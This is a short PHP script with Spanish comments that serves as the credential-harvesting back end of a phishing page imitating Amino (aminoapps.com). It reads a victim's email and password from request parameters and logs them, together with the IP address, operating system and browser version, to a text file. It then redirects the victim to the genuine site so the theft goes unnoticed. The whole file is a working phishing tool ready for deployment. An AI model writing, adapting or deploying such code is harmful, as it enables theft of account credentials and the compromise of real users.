<?php

header("Location: https://aminoapps.com/");

$info = detect();

$user = $_GET["user"];
$pass = $_GET["pass"];
$ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) 
    ? $_SERVER['HTTP_X_FORWARDED_FOR'] 
    : $_SERVER['REMOTE_ADDR'];

$os = $info["os"];
$browser = $info["browser"];
$version = $info["version"];

$file = fopen("usuarios.txt","a");
fwrite($file,"Email: $user\nContraseña: $pass\n");
fwrite($file,"IP: $ip\n");
fwrite($file,"Sistema Operativo: $os\n");
fwrite($file,"Navegador: $browser\n");
fwrite($file,"Version: $version\n\n");
fclose($file);


function detect()
{
	$browser=array("IE","OPERA","MOZILLA","NETSCAPE","FIREFOX","SAFARI","CHROME");
	$os=array("WIN","MAC","LINUX");
 
	# definimos unos valores por defecto para el navegador y el sistema operativo
	$info['browser'] = "OTHER";
	$info['os'] = "OTHER";
 
	# buscamos el navegador con su sistema operativo
	foreach($browser as $parent)
	{
		$s = strpos(strtoupper($_SERVER['HTTP_USER_AGENT']), $parent);
		$f = $s + strlen($parent);
		$version = substr($_SERVER['HTTP_USER_AGENT'], $f, 15);
		$version = preg_replace('/[^0-9,.]/','',$version);
		if ($s)
		{
			$info['browser'] = $parent;
			$info['version'] = $version;
		}
	}
 
	# obtenemos el sistema operativo
	foreach($os as $val)
	{
		if (strpos(strtoupper($_SERVER['HTTP_USER_AGENT']),$val)!==false)
			$info['os'] = $val;
	}
 
	# devolvemos el array de valores
	return $info;
}

?>